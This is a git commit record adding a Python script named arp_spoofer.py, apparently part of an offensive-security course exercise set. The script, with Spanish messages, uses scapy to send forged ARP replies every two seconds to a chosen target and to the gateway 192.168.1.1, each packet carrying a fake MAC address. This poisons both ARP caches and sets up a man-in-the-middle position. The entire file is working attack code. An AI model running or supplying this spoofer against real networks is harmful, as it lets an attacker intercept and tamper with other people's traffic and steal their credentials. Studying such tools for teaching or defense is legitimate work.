aabef1ed7ba43603b7aad39bfab4880a80a8814c
M0xX <m0xx@nitro5>
2026-05-31 00:08:22 -0500

    ARP Spoofer

---
+++ Python/Hack4U/Ofensivo/ARP_Spoofer/arp_spoofer.py
@@ -0,0 +1,38 @@
+#!/usr/bin/env python3
+
+import argparse
+import signal
+import time
+import sys
+import scapy.all as scapy
+from termcolor import colored
+
+def def_handler(sig, frame):
+    print(colored(f"\nSaliendo...", "red"))
+    sys.exit(1)
+
+signal.signal(signal.SIGINT, def_handler)
+
+def get_arguments():
+    parser = argparse.ArgumentParser(description="Envenenador ARP!")
+    parser.add_argument("-t", "--target", required=True, dest="ip_address", help="Target")
+
+    return parser.parse_args()
+
+def spoof(ip_address, spoof_ip):
+    arp_packet = scapy.ARP(op=2, psrc=spoof_ip, pdst=ip_address, hwsrc="aa:bb:cc:44:55:66")
+    scapy.send(arp_packet, verbose=False)
+
+    #arp_packet.show()
+
+def main():
+    args = get_arguments()
+
+    while True:
+        spoof(args.ip_address, "192.168.1.1")
+        spoof("192.168.1.1", args.ip_address)
+
+        time.sleep(2)
+
+if __name__ == "__main__":
+    main()
